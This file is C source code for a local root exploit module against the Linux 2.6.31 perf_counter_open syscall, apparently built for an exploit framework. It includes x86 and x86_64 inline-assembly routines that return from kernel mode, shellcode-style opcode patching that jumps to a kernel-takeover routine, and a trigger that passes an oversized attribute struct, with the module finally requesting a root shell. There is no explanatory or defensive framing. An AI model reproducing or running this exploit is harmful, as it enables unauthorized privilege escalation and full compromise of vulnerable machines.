/* yup */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "exp_framework.h"

#ifdef __x86_64__
#ifndef __NR_perf_counter_open
#define __NR_perf_counter_open 298
#endif
#define USER_CS 0x33
#define USER_SS 0x2b
#define USER_FL 0x246
#else
/* x86 */
#ifndef __NR_perf_counter_open
#define __NR_perf_counter_open 336
#endif
#define USER_CS 0x73
#define USER_SS 0x7b
#define USER_FL 0x246
#endif

struct perf_counter_attr {
	unsigned int type;
	unsigned int size;
};

#define STACK(x)	(x + sizeof(x) - 80)

char exit_stack[1024*1024];
struct exploit_state *exp_state;

char *desc = "Powerglove: Linux 2.6.31 perf_counter local root";

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

unsigned long trigger_retaddr;

/* greets to qaaz */
static void exit_kernel()
{
#ifdef __x86_64__
	asm volatile (
	"swapgs ;"
	"movq %0, 0x20(%%rsp) ;"
	"movq %1, 0x18(%%rsp) ;"
	"movq %2, 0x10(%%rsp) ;"
	"movq %3, 0x08(%%rsp) ;"
	"movq %4, 0x00(%%rsp) ;"
	"iretq"
	: : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
	"i" (USER_CS), "r" (trigger_retaddr)
	);
#else
	asm volatile (
	"movl %0, 0x10(%%esp) ;"
	"movl %1, 0x0c(%%esp) ;"
	"movl %2, 0x08(%%esp) ;"
	"movl %3, 0x04(%%esp) ;"
	"movl %4, 0x00(%%esp) ;"
	"iret"
	: : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
	"i" (USER_CS), "r" (trigger_retaddr)
	);
#endif
}

int prepare(unsigned char *ptr)
{
	ptr[0] = '\xff';
	ptr[1] = '\x15';
	*(unsigned int *)&ptr[2] = (sizeof(unsigned long) != sizeof(unsigned int)) ? 6 : 12;
	ptr[6] = '\xff';
	ptr[7] = '\x25';
	*(unsigned int *)&ptr[8] = (sizeof(unsigned long) != sizeof(unsigned int)) ? sizeof(unsigned long) : 16;
	*(unsigned long *)&ptr[12] = (unsigned long)exp_state->own_the_kernel;
	*(unsigned long *)&ptr[12 + sizeof(unsigned long)] = (unsigned long)&exit_kernel;
}

int trigger(void)
{
	struct perf_counter_attr *ctr;

	trigger_retaddr = (unsigned long)__builtin_return_address(0);

	ctr = (struct perf_counter_attr *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (ctr == MAP_FAILED) {
		fprintf(stdout, "bleh\n");
		exit(1);
	}

#ifdef __x86_64__
	ctr->size = 0xd0;
#else
	ctr->size = 0x60;
#endif
	
	syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL);

	return 0;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
